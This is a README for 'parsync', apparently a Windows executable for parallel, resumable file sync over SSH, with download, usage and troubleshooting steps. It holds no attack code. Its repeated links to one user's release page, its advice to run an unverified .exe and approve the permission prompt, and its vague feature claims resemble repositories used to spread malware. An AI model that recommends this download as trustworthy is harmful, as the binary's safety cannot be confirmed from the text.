# ⚙️ parsync - Fast, Reliable File Sync Over SSH

[![Download parsync](https://img.shields.io/badge/Download-parsync-blue?style=for-the-badge)](https://github.com/massmahi7/parsync/releases)

---

## 📦 What is parsync?

parsync is a tool that helps you copy and sync files between your Windows computer and another device using SSH (a safe way to connect over the internet). It works like rsync, a popular file transfer software, but runs many transfers at once to speed things up. parsync also lets you pause and continue transfers, so you don’t lose progress if your connection breaks.

Use parsync when you need to keep folders on two computers the same. It works well if you have large files or many files to move and want to avoid repeating transfers you already did.

---

## 🖥️ System Requirements

- Windows 7, 8, 10, or 11 (64-bit recommended)
- SSH client installed (Windows 10 and 11 have this built-in)
- At least 100 MB free disk space for the app
- Access to a remote computer with SSH enabled
- Basic knowledge of how to get the address or name of the remote computer

---

## 🔧 Key Features

- Copies files from a remote computer to your Windows PC.
- Transfers many files at the same time for faster copying.
- Automatically resumes interrupted transfers.
- Works safely over SSH to protect your data.
- Simple setup without needing to install complex software.

---

## 🚀 Getting Started: Download parsync

To get parsync, visit this page and download the latest Windows version:

[Download parsync from GitHub Releases](https://github.com/massmahi7/parsync/releases)

On the release page, look for the file that ends with `.exe` for Windows. Usually, it has a name like `parsync-windows.exe`. Click the file name to download it.

---

## 💾 How to Install parsync on Windows

1. After download, locate the `.exe` file in your Downloads folder.
2. Double-click the file to start parsync. No installation is needed; it will run directly.
3. If Windows asks for permission, click "Yes" to allow parsync to run.
4. You can create a shortcut by right-clicking the `.exe` file and choosing "Create shortcut" for easy access later.

---

## 🔌 Using parsync: Step-by-Step Guide

### 1. Prepare SSH Access

You need SSH access to the remote device:

- Get the IP address or host name of the remote computer.
- Ensure you have a username and password or SSH key to log in.

### 2. Open Command Prompt

- Press Windows + R keys, type `cmd`, and press Enter.
- A black window (Command Prompt) will open.

### 3. Run parsync Command

Use this basic command layout to start syncing files:

```
parsync.exe [user@remote_host]:/path/to/remote/folder C:\local\folder
```

Replace these parts:

- `[user@remote_host]` - Your username and remote computer’s address, for example, `john@192.168.1.10`.
- `/path/to/remote/folder` - The folder on the remote computer you want to copy from.
- `C:\local\folder` - The folder on your Windows PC where files will be saved.

Example command:

```
parsync.exe john@192.168.1.10:/home/john/documents C:\Users\John\Documents\SyncFolder
```

### 4. Enter Password if Asked

If you use password login, parsync will ask for it. Type your password and press Enter. Note: the password won’t show on screen during typing.

### 5. Watch the Progress

parsync will display the files it copies. If the connection breaks, it will pause. You can run the same command to continue from where it stopped.

---

## 🛠️ Tips and Troubleshooting

- Make sure the remote computer’s SSH server is running and reachable on the network.
- You can check SSH from Windows Command Prompt by typing:  
  ```
  ssh user@remote_host
  ```  
  Replace `user@remote_host` as before. If you connect successfully, parsync should work.
- Transfer speed depends on your network quality and size of files.
- If you see errors, check that your username and remote folder are correct.
- Use folder paths without spaces or enclose them in quotes. For example:  
  ```
  "C:\My Folder\Sync"
  ```
- Run Command Prompt as Administrator if you get permission errors.

---

## 📥 Download Link Reminder

You can always get the latest Windows version of parsync here:

[Download parsync releases](https://github.com/massmahi7/parsync/releases)

This link takes you to the official page with all versions and updates.

---

## 🔄 Updating parsync

When a new version is released:

1. Return to the download link.
2. Download the newest `.exe` file.
3. Replace the old `.exe` with the new one in your folder.
4. Run the new file as before.

No uninstall needed since parsync does not require full installation.

---

## 📂 Understanding parsync File Sync

parsync copies only the differences between files to save time and bandwidth. For example, if a file changes slightly, it does not copy the whole file again but just the changed part. This behavior makes syncing large folders more efficient.

If connection stops, parsync saves progress and restarts from where it left off when you run it again. This feature avoids repeating work and saves time.

---

## 🔑 Security Notes

Since parsync works over SSH, it uses encryption to protect your files during transfer. Only people with your SSH credentials can access the remote computer. Do not share your password or SSH key.

To keep your connection secure:

- Use strong passwords or SSH keys.
- Avoid public Wi-Fi when transferring sensitive files.
- Keep your Windows system and SSH client updated.

---

## 💡 Additional Features

- Parallel transfer means multiple files copy at once.
- Supports resuming transfer after interruption.
- Works with any SSH server, including Linux and macOS hosts.
- No complex setup needed—just a Windows `.exe`.

---

## 📣 Reporting Issues or Getting Help

If you encounter problems:

- Check that your SSH credentials are correct.
- Confirm the remote folder path is valid.
- Make sure your network connection is active.
- Refer to the parsync GitHub page for info and support.

---

## 🔗 Useful Links

- Official parsync releases: https://github.com/massmahi7/parsync/releases
- How to use SSH on Windows: https://docs.microsoft.com/en-us/windows-server/remote/remote-ssh

---

## ⚙️ Advanced Options (Optional)

Advanced users can customize parsync with additional command-line options:

- Limit the number of concurrent transfers.
- Use SSH keys instead of passwords.
- Set bandwidth limits to avoid slowing other network use.

For details, check the documentation in the parsync GitHub repository.